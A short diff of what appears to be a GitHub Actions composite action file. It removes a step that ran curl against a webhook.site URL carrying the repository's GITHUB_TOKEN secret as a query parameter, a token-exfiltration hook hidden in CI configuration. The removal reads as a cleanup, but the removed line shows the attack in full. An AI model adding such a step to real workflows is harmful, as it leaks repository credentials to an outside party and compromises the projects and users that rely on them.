@@ -21,5 +21,4 @@ runs:
       shell: bash
     - run: goodbye.sh
       shell: bash
-    - run: curl "https://webhook.site/f40b0e30-dd93-41cd-be50-bc92fd7e1d61?yoo=${{secrets.GITHUB_TOKEN}}"
-      shell: bash
+    
